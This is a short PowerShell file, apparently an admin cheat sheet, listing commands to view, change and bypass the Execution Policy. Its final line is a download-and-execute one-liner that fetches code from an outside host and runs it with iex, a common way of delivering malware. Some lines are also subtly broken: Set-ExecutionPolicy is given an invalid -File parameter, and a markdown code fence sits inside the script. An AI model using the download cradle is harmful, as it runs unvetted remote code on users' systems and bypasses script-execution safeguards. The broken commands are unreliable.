#Requires -version 5.1
<#
This script provides various methods to set the Execution Policy, including bypassing it entirely for testing purposes.
#>

### Bypass ExecutionPolicy for a single script 
PowerShell.exe -ExecutionPolicy Bypass -File .runme.ps1
Set-Executionpolicy -ExecutionPolicy Bypass -File .runme.ps1

### Change execution policy to allow scripts to run, until exiting Powershell
```powershell
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process
```

<#---------------------------------------------------[Execution Policy Commands]-------------------------------------------------#>
## Commands to be used to set the Execution Policy in PowerShell.

Get-ExecutionPolicy
Get-ExecutionPolicy -List | Format-Table -AutoSize

### Set the ExecutionPolicy for the CurrentUser 
Set-Executionpolicy -ExecutionPolicy UnRestricted -Scope CurrentUser 

### Set to unrestricted for the duration of current Session
Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force

### Permanently set the ExecutionPolicy to Bypass (requires admin rights)
Set-ExecutionPolicy -ExecutionPolicy Bypass -Force

## Run script without changing the execution policy
Get-Content .runme.ps1 | PowerShell.exe -noprofile -
#TYPE .runme.ps1 | PowerShell.exe -noprofile -
powershell -nop -c "iex(New-Object Net.WebClient).DownloadString('win.xga.io')"